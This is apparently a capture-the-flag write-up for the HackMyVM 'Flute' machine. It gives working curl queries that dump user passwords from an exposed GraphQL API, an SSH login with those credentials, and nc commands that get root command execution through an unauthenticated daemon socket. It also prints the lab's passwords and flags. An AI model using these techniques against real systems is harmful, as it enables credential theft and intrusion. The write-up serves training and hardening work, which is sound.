# 🐚 HackMyVM — Flute Writeup

## 📌 Machine Information

* **Name:** Flute
* **Platform:** HackMyVM
* **IP:** `192.168.56.101`

---

## 🔍 Reconnaissance

Initial scan:

```bash
nmap -sC -sV -p- 192.168.56.101
```

### 📊 Nmap Result

```
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 10.0 (protocol 2.0)
8888/tcp open  sun-answerbook?
```

### Key Findings:

* **22/tcp → SSH (OpenSSH 10.0)**
* **8888/tcp → Unknown HTTP service**

  * Response: `query missing`
  * CORS enabled (`Access-Control-Allow-Origin: *`)

👉 This hinted towards a **GraphQL API (Apollo Server)**.

---

## 🌐 Enumeration — GraphQL

Visiting port **8888** revealed an **Apollo GraphQL server**.

Since GraphQL was exposed, introspection was tested.

---

### 🔎 Dump Schema

```bash
curl -X POST http://192.168.56.101:8888 \
-H "Content-Type: application/json" \
-d '{"query":"{ __schema { types { name fields { name } } } }"}'
```

### 🧠 Result:

* Found type: `User`
* Fields:

  * `username`
  * `password`
* Queries:

  * `users`
  * `user`

👉 This indicates **sensitive data exposure via GraphQL**

---

### 🔥 Dump Credentials

```bash
curl -X POST http://192.168.56.101:8888 \
-H "Content-Type: application/json" \
-d '{"query":"{ users { username password } }"}'
```

### 📌 Output:

```json
{
  "users": [
    {"username": "admin", "password": "imtherealadmin"},
    {"username": "hamelin", "password": "comewithmerats"}
  ]
}
```

👉 Credentials obtained successfully

---

## 🔐 Initial Access (SSH)

Tried SSH login:

```bash
ssh hamelin@192.168.56.101
```

✔️ Login successful using:

* **User:** hamelin
* **Password:** comewithmerats

---

### 🏁 User Flag

```bash
cat user.txt
```

```
HMVuser9f4ndbazREDACTED
```

---

## 🚀 Privilege Escalation

### 🔍 Enumeration

```bash
uname -a
sudo -l
find / -perm -4000 -type f 2>/dev/null
ps aux
```

### 🧠 Observations:

* No `sudo`
* SUID binary:

  ```
  /bin/bbsuid
  ```
* Interesting process running as root:

  ```
  /usr/bin/python3 /opt/ratd/ratd.py
  ```

👉 Custom Python service running as **root**

---

## 🧩 Analyzing `ratd.py`

```python
import socket
import os

sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
socket_path = "/tmp/ratd.sock"

if os.path.exists(socket_path):
    os.remove(socket_path)

sock.bind(socket_path)
os.chmod(socket_path, 0o777)
sock.listen(1)

print("Rat daemon running...")

while True:
    conn, _ = sock.accept()
    data = conn.recv(1024).decode()

    if data.startswith("RUN "):
        cmd = data[4:]
        os.system(cmd)
        conn.send(b"OK\n")
    else:
        conn.send(b"Unknown command\n")

    conn.close()
```

### 🚨 Vulnerability:

* World-writable socket (`777`)
* No authentication
* Direct execution via `os.system()`

👉 **Unauthenticated root command execution**

---

## 💀 Exploitation

### 🔎 Confirm socket

```bash
ls -l /tmp/ratd.sock
```

```
srwxrwxrwx
```

---

### ⚡ Execute commands as root

```bash
echo 'RUN whoami > /tmp/out' | nc -U /tmp/ratd.sock
cat /tmp/out
```

Output:

```
root
```

---

### 🏁 Get Root Flag

```bash
echo 'RUN cat /root/root.txt > /tmp/flag' | nc -U /tmp/ratd.sock
cat /tmp/flag
```

### 📌 Output:

```
HMVrootoepsamqu0liphzzsc7x9
```

---

## 🧠 Vulnerability Summary

### 1. GraphQL Misconfiguration

* Introspection enabled
* Sensitive fields exposed (`password`)
* No authentication

👉 Leads to **credential disclosure**

---

### 2. Insecure Local Service (ratd.py)

* World-writable UNIX socket
* No authentication
* Arbitrary command execution as root

👉 Leads to **privilege escalation**

---

## 🔗 Full Attack Chain

1. **Port Scan → Identify GraphQL**
2. **GraphQL Introspection → Dump schema**
3. **Query users → Extract credentials**
4. **SSH login as user**
5. **Enumerate processes → find root daemon**
6. **Exploit UNIX socket → execute commands as root**
7. **Read root flag**

---

## 🎯 Key Takeaways

* GraphQL endpoints must:

  * Disable introspection in production
  * Implement proper authorization

* Local services must:

  * Avoid world-writable sockets
  * Validate and sanitize input
  * Never use `os.system()` unsafely

---

## 🏁 Final Flags

* **User Flag:** `HMVuser9f4ndbazREDACTED`
* **Root Flag:** `HMVrootoepsamqu0liphzzsc7x9`

---

## 💡 Conclusion

This machine demonstrates a realistic attack chain:

* **Application-layer vulnerability (GraphQL)**
* → **Credential compromise**
* → **Local privilege escalation via insecure service**
